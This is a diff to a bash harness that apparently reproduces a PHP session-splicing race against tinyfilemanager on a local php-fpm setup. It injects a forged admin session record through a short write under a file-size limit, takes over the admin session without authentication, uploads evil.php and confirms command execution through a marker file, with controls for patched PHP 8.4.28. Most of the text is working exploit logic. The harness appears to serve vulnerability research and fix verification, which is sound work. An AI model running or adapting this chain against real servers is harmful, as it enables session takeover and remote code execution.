@@ -71,7 +71,8 @@ mkdir -p "$OUT"
 LOG="$OUT/aftershell-tfm-$LABEL.log"
 : > "$LOG"
 SCRIPT_SHA=$(sha256sum "$0"); SCRIPT_SHA=${SCRIPT_SHA%% *}
-echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0} script_sha256=$SCRIPT_SHA" >> "$LOG"
+ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo unknown)
+echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0} gap=$GAP script_sha256=$SCRIPT_SHA" >> "$LOG"
 
 REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
 SO="$REPOROOT/lab/preload/aftershell-kill.so"
@@ -94,12 +95,15 @@ ARM="$D/armed"
 APPSID=
 KA2=""
 GAP_UPLOAD_DONE=0
+GAP_FOUND=1
+GAP_PRODUCER_ALIVE_AT_UPLOAD=0
 BOUNDARY='---------------------------20896060251896012921717172737'
 HOST=127.0.0.1
 
 OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
 FILLER=${FILLER:-X}
 [ "${#FILLER}" = 1 ] || { echo "FILLER must be one byte"; exit 2; }
+echo "conditions: sid=$SID filler=$FILLER progress_freq=$PROGRESS_FREQ attack_bytes=$ARMED_BYTES trail_bytes=$ARMED_TRAIL_BYTES aslr=$ASLR" >> "$LOG"
 X700=$(head -c 700 /dev/zero | tr '\0' "$FILLER")
 rm -f "$WEB/evil.php"
 EVIL="$D/evil.php"
@@ -414,20 +418,22 @@ if [ "$GAP" = 1 ]; then
     export CF_PORT=$CPORT
     rm -f "$D/splice-seen" "$D/gap-found"
     (
-    python3 - "$SESS/sess_$SID" "$K" "$D/splice-seen" "$D/gap-found" "$FILLER" <<'PY' >> "$LOG" 2>&1
+    python3 - "$SESS/sess_$SID" "$K" "$D/splice-seen" "$D/gap-found" "$FILLER" "$CARRIER" <<'PY' >> "$LOG" 2>&1
 import os, shutil, sys, time
-path, k, seen, found, filler = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5].encode()
+path, k, seen, found, filler, carrier = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5].encode(), sys.argv[6]
+c = open(carrier, 'rb').read()
 deadline = time.monotonic() + 20
 while time.monotonic() < deadline:
     try:
         with open(path, 'rb') as f:
             d = f.read(200000)
-        if len(d) > k and d[k:k+16] == b'filemanager|a:1:' and d[:k].endswith(b'}') and d[:k].count(filler * 16) >= 1:
-            print('gap-candidate: len=%d prefix=%r tail-at-K=%r' % (len(d), d[:24], d[k:k+40]))
+        tail_ok = len(d) > k and d[k:] == c[k:]
+        if tail_ok and d[k:k+16] == b'filemanager|a:1:' and d[:k].endswith(b'}') and d[:k].count(filler * 16) >= 1:
+            print('gap-candidate: len=%d prefix=%r tail-at-K=%r exact-tail:%s' % (len(d), d[:24], d[k:k+40], tail_ok))
             if d.startswith(b'upload_progress_carr|'):
                 shutil.copyfile(path, seen)
                 open(found, 'w').write(str(time.monotonic()))
-                print('gap-watcher: splice seen at %d bytes, offset %d == %r' % (len(d), k, d[k:k+40]))
+                print('gap-watcher: armed splice seen at %d bytes, offset %d, exact carrier tail' % (len(d), k))
                 sys.exit(0)
     except OSError:
         pass
@@ -450,10 +456,13 @@ PY
 d=open(sys.argv[1],"r",errors="replace").read()
 m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
 print(m.group(1) if m else "")' "$D/consumerA.out")
-    if [ -n "$GAP_TOKEN" ]; then
+    if [ -n "$GAP_TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerA.out" && [ "$GAP_FOUND" = 0 ] && kill -0 "$OLDCHILD" 2>/dev/null && kill -0 "$PRODPID" 2>/dev/null; then
+        GAP_PRODUCER_ALIVE_AT_UPLOAD=1
         upload "$GAP_TOKEN" > "$D/upload.out" 2>&1
         GAP_UPLOAD_DONE=1
-        echo "gap: admin upload fired with token $GAP_TOKEN while producer request $PRODPID is live" | tee -a "$LOG"
+        echo "gap: authenticated admin upload fired with token $GAP_TOKEN while producer worker $OLDCHILD and request $PRODPID were live" | tee -a "$LOG"
+    else
+        echo "gap: no authenticated in-gap upload (watcher=$GAP_FOUND producer_live=$(kill -0 "$OLDCHILD" 2>/dev/null && kill -0 "$PRODPID" 2>/dev/null && echo yes || echo no))" | tee -a "$LOG"
     fi
     wait "$PRODPID"; RC=$?
 else
@@ -474,37 +483,63 @@ fi
 
 NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
 echo "master worker after run: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
-[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — CPU death may not have fired" >> "$LOG"
+if [ "$NEWCHILD" = "$OLDCHILD" ]; then
+    [ "$GAP" = 1 ] && echo "producer worker survived: $OLDCHILD" >> "$LOG" \
+                   || echo "WARNING: same child pid — CPU death may not have fired" >> "$LOG"
+fi
 DEATH_OK=1
+GAP_NO_DEATH_OK=0
 if [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ] && [ "$GAP" = 0 ]; then
     DEATH_OK=0
     if [ "$NEWCHILD" != "$OLDCHILD" ] && grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null; then
         DEATH_OK=1
     fi
     echo "producer-death-check: old=$OLDCHILD new=$NEWCHILD signal9=$(grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null && echo yes || echo no) ok=$DEATH_OK" >> "$LOG"
+elif [ "$GAP" = 1 ]; then
+    if [ "$GAP_FOUND" = 0 ] && [ "$GAP_PRODUCER_ALIVE_AT_UPLOAD" = 1 ] && [ "$NEWCHILD" = "$OLDCHILD" ] && kill -0 "$OLDCHILD" 2>/dev/null && ! grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null; then
+        GAP_NO_DEATH_OK=1
+    fi
+    echo "gap-no-death-check: watcher=$GAP_FOUND producer_alive_at_upload=$GAP_PRODUCER_ALIVE_AT_UPLOAD old=$OLDCHILD new=$NEWCHILD signal9=$(grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null && echo yes || echo no) ok=$GAP_NO_DEATH_OK" >> "$LOG"
 fi
 
-MIXOK=0
-SPLICE_FILE=$ATTACK_FILE
-[ "$GAP" = 1 ] && [ -f "$D/splice-seen" ] && SPLICE_FILE="$D/splice-seen"
-if [ -f "$SPLICE_FILE" ]; then
-    python3 - "$SPLICE_FILE" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
+check_splice() {
+    python3 - "$1" "$CARRIER" "$K" "$2" <<'EOF'
 import sys
 f = open(sys.argv[1], 'rb').read()
 c = open(sys.argv[2], 'rb').read()
 k = int(sys.argv[3])
+label = sys.argv[4]
 prefix_ok = f[:k].startswith(b'upload_progress_carr|a:') and f[:k].endswith(b'}')
 tail_ok = len(f) > k and f[k:] == c[k:]
 boundary_ok = f[k:k+44].startswith(b'filemanager|a:1:')
 ok = prefix_ok and tail_ok and boundary_ok
-print(f"splice-check: filelen={len(f)} K={k} new-record-prefix:{prefix_ok} tail==carrier-tail:{tail_ok} obj-at-K:{f[k:k+44][:24]!r}")
+print(f"splice-check[{label}]: filelen={len(f)} K={k} new-record-prefix:{prefix_ok} tail==carrier-tail:{tail_ok} obj-at-K:{f[k:k+44][:24]!r}")
 sys.exit(0 if ok else 1)
 EOF
+}
+MIXOK=0
+FINALMIXOK=0
+SPLICE_FILE=$ATTACK_FILE
+[ "$GAP" = 1 ] && [ -f "$D/splice-seen" ] && SPLICE_FILE="$D/splice-seen"
+if [ -f "$SPLICE_FILE" ]; then
+    check_splice "$SPLICE_FILE" pre-consumer >> "$LOG" 2>&1 && MIXOK=1
 else
-    echo "splice-check: attacker session file absent" >> "$LOG"
+    echo "splice-check[pre-consumer]: attacker session file absent" >> "$LOG"
 fi
-[ "$MIXOK" = 1 ] && echo "  post-run file state: k1new || C[K:] splice on disk" >> "$LOG" \
-               || echo "  post-run file state: NOT the splice (8.4.28: expected)" >> "$LOG"
+if [ -f "$ATTACK_FILE" ]; then
+    check_splice "$ATTACK_FILE" final >> "$LOG" 2>&1 && FINALMIXOK=1
+else
+    echo "splice-check[final]: attacker session file absent" >> "$LOG"
+fi
+if [ "$GAP" = 1 ]; then
+    [ "$MIXOK" = 1 ] && echo "  pre-consumer snapshot: armed k1new || C[K:] splice" >> "$LOG" \
+                   || echo "  pre-consumer snapshot: NOT the splice" >> "$LOG"
+    [ "$FINALMIXOK" = 1 ] && echo "  final attacker file: splice persisted" >> "$LOG" \
+                        || echo "  final attacker file: splice did not persist (expected timing boundary)" >> "$LOG"
+else
+    [ "$FINALMIXOK" = 1 ] && echo "  final file state: k1new || C[K:] splice on disk" >> "$LOG" \
+                        || echo "  final file state: NOT the splice (8.4.28: expected)" >> "$LOG"
+fi
 [ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"
 
 # PHP 8.4.28+ rejects tinyfilemanager's runtime session ini change while
@@ -599,7 +634,11 @@ echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes |
 # leave a fresh marker absent rather than counting the earlier positive file.
 rm -f "$MARKER" "$WEB/evil.php"
 
-# ---- control: identical carrier + replacement WITHOUT the CPU death
+# ---- control: identical carrier + replacement, but consume only after the
+# producer request completes. For GAP=1 this is a timing/post-completion
+# control; for CPU-death modes it is the no-death differential.
+CTL_KIND=no-death
+[ "$GAP" = 1 ] && CTL_KIND=post-completion-timing
 build_carrier "$PADLEN"
 POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
 echo "control-write rc=$?" >> "$LOG"
@@ -615,28 +654,28 @@ ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d
 print(f"control-write-dump: has-evil-record:{ok}")
 sys.exit(0 if ok else 1)
 EOF
-    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without death — harness invalid" | tee -a "$LOG" \
-                           || echo "   control (no death): no evil record in the app session write, as expected" | tee -a "$LOG"
+    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record in $CTL_KIND control — harness invalid" | tee -a "$LOG" \
+                           || echo "   control ($CTL_KIND): no evil record in the app session write, as expected" | tee -a "$LOG"
 fi
 CTL_TOKEN=$(python3 -c 'import re,sys
 d=open(sys.argv[1],"r",errors="replace").read()
 m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"",d)
 print(m.group(1) if m else "")' "$D/consumerCTL.out")
 if [ -n "$CTL_TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
-    echo "   CONTROL UNEXPECTED: logged-in page without death — inspect $LOG" | tee -a "$LOG"
+    echo "   CONTROL UNEXPECTED: logged-in page in $CTL_KIND control — inspect $LOG" | tee -a "$LOG"
 elif grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
-    echo "   control (no death): login form, no session takeover" | tee -a "$LOG"
+    echo "   control ($CTL_KIND): login form, no session takeover" | tee -a "$LOG"
 else
     echo "   CONTROL INVALID: neither login form nor admin page — inspect $LOG" | tee -a "$LOG"
 fi
 if [ -f "$WEB/evil.php" ] || [ -f "$MARKER" ]; then
-    echo "   CONTROL UNEXPECTED: upload or marker present without death" | tee -a "$LOG"
+    echo "   CONTROL UNEXPECTED: upload or marker present in $CTL_KIND control" | tee -a "$LOG"
 fi
 CTL_OK=0
 if grep -q 'name="fm_usr"' "$D/consumerCTL.out" && [ "$CTL_PROMOTED" = 0 ] && [ ! -f "$WEB/evil.php" ] && [ ! -f "$MARKER" ]; then
     CTL_OK=1
 fi
-echo "control-no-death-check: ok=$CTL_OK" >> "$LOG"
+echo "control-$CTL_KIND-check: ok=$CTL_OK" >> "$LOG"
 
 # safe-input control: virgin sid, no carrier, no death
 rm -f "$SESS"/sess_* "$WEB/evil.php" "$MARKER"
@@ -652,8 +691,15 @@ echo "safe-input-check: ok=$SAFE_OK" >> "$LOG"
 
 # ---------------------------------------------------------------- verdict
 echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
-[ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
-                  || echo "   post-run file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
+if [ "$GAP" = 1 ]; then
+    [ "$MIXOK" = 1 ] && echo "   pre-consumer snapshot: armed k1new || C[K:] splice" | tee -a "$LOG" \
+                   || echo "   pre-consumer snapshot: NOT the splice" | tee -a "$LOG"
+    [ "$FINALMIXOK" = 1 ] && echo "   final attacker file: splice persisted" | tee -a "$LOG" \
+                        || echo "   final attacker file: splice did not persist" | tee -a "$LOG"
+else
+    [ "$FINALMIXOK" = 1 ] && echo "   final file: k1new || C[K:] splice on disk" | tee -a "$LOG" \
+                         || echo "   final file: NOT the splice (8.4.28: expected)" | tee -a "$LOG"
+fi
 if [ "$PROMOTED" = 2 ]; then
     echo "   native producer/consumer: no preload; promotion judged by tinyfilemanager authentication" | tee -a "$LOG"
 else
@@ -661,11 +707,15 @@ else
                         || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
 fi
 [ "$TAKEOVER" = 1 ] && echo "   UNAUTH SESSION TAKEOVER of tinyfilemanager admin through the splice" | tee -a "$LOG" \
-                    || echo "   no takeover (8.4.28/no-death: expected)" | tee -a "$LOG"
+                    || echo "   no takeover (fixed/no-gap: expected)" | tee -a "$LOG"
 if [ "$EXECOK" = 1 ]; then
-    echo "   UNAUTH -> $DEATH_MODE SHORT-WRITE/STATE-FREEZE -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
+    if [ "$GAP" = 1 ]; then
+        echo "   UNAUTH -> FSIZE SHORT-WRITE -> IN-GAP ADMIN UPLOAD -> LIVE CONSUMER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
+    else
+        echo "   UNAUTH -> $DEATH_MODE SHORT-WRITE/STATE-FREEZE -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
+    fi
 else
-    echo "   no command execution (8.4.28/no-death: expected)" | tee -a "$LOG"
+    echo "   no command execution (fixed/no-gap: expected)" | tee -a "$LOG"
 fi
 if [ "$DEATH_MODE" = rlimit ]; then
     echo "   native limits: worker FSIZE=$K:$K CPU=${CPU_LIMIT:-none}:${CPU_LIMIT:-none}; phase-2 LD_PRELOAD unset" | tee -a "$LOG"
@@ -676,16 +726,22 @@ if [ -f "$D/fpm-error.log" ]; then
     echo "--- fpm-error.log ---" >> "$LOG"
     grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
 fi
+MECH_OK=0
+if [ "$GAP" = 1 ]; then
+    [ "$GAP_NO_DEATH_OK" = 1 ] && MECH_OK=1
+else
+    [ "$DEATH_OK" = 1 ] && MECH_OK=1
+fi
 POSITIVE_OK=0
 NEGATIVE_OK=0
-if [ "$MIXOK" = 1 ] && [ "$TAKEOVER" = 1 ] && [ "$EXECOK" = 1 ] && [ "$MARKER_OK" = 1 ] && [ "$DEATH_OK" = 1 ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
+if [ "$MIXOK" = 1 ] && [ "$TAKEOVER" = 1 ] && [ "$EXECOK" = 1 ] && [ "$MARKER_OK" = 1 ] && [ "$MECH_OK" = 1 ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
     POSITIVE_OK=1
 fi
-if [ "$MIXOK" = 0 ] && [ "$TAKEOVER" = 0 ] && [ "$EXECOK" = 0 ] && [ ! -f "$MARKER" ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
+if [ "$MIXOK" = 0 ] && [ "$FINALMIXOK" = 0 ] && [ "$TAKEOVER" = 0 ] && [ "$EXECOK" = 0 ] && [ ! -f "$MARKER" ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
     NEGATIVE_OK=1
 fi
-echo "result-check: positive=$POSITIVE_OK negative=$NEGATIVE_OK death=$DEATH_OK marker=$MARKER_OK no-death-control=$CTL_OK safe-control=$SAFE_OK" | tee -a "$LOG"
-if { [ "$APP_HEALTH" = 0 ] && { [ "$DEATH_MODE" = shim ] || [ "${PREBURN:-0}" = 1 ]; }; } || [ "$GAP" = 1 ]; then
+echo "result-check: positive=$POSITIVE_OK negative=$NEGATIVE_OK mechanism=$MECH_OK gap_no_death=$GAP_NO_DEATH_OK marker=$MARKER_OK timing-control=$CTL_OK safe-control=$SAFE_OK" | tee -a "$LOG"
+if [ "$APP_HEALTH" = 0 ] && { [ "$GAP" = 1 ] || { [ "$GAP" = 0 ] && { [ "$DEATH_MODE" = shim ] || [ "${PREBURN:-0}" = 1 ]; }; }; }; then
     [ "$POSITIVE_OK" = 1 ]
 else
     [ "$NEGATIVE_OK" = 1 ]
